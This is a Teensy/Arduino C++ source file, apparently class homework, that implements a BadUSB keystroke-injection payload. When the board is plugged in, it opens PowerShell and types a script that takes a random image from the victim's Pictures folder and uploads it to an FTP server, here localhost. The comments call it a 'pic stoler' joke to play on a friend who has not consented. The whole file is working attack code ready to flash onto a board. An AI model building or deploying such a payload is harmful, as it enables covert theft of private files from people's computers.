/*--------------------------------------------------------------------------------*/
/*This code is a home work from a security master class from Algiers, it just     */
/*excute some hacks on a victim Computer using a very simple command line.        */
/*this code can be uploaded on Teensy and also on other equivalente boards like   */
/*like Arduino and NodeMCU and perhaps other boards.                              */
/*By SOAL Abdeldjallil                                                            */
/*--------------------------------------------------------------------------------*/
#include <Arduino.h>
#include "../lib/PlaywithTeensy.h"

void writeline(String cmd){
    delay(100);
    Keyboard.print(cmd);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void openPowerShell(){
   delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.println("PowerShell");  
    Keyboard.send_now();
    delay(100);


     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void ExecutePowershellCMD(String cmd){
    openPowerShell();
    writeline(cmd);
}


/* this JOKE is a pic stoler , it choses a rondom picture from the default pictures folder 
in windows OS "Pictures/" and it send it to an ftp depot, you can just play with your friend
and tel him that for example 'you're a magician (science is magic because magic is science)
and you will have his photo in your phone in just 60 seconds whithout touch his keyboard */
void setup() {
    // put your setup code here, to run once:
    //Init LED for blinking
    pinMode(LED_BUILTIN, OUTPUT);
    
    //turn led on to show that the teensy is working
    digitalWrite(LED_BUILTIN, HIGH);
    
    //excuting 
    ExecutePowershellCMD("cd .\Pictures\ \n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://localhost/joke.png\") \n$ftp = [System.Net.FtpWebRequest]$ftp \n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile \n$ftp.Credentials = new-object System.Net.NetworkCredential(\"anonymous\",\"anonymous@localhost\") \n$ftp.UseBinary = $true \n$ftp.UsePassive = $true \n$filename = Get-ChildItem -name | Select-Object -index $(Random $((Get-ChildItem).Count)) \n$content = [System.IO.File]::ReadAllBytes($filename) \n$ftp.ContentLength = $content.Length \n$rs = $ftp.GetRequestStream() \n$rs.Write($content, 0, $content.Length) \n$rs.Close() \n$rs.Dispose() \n");
    
    //turn led of when teensy finish his "mission"
    digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
   delay(1000);
}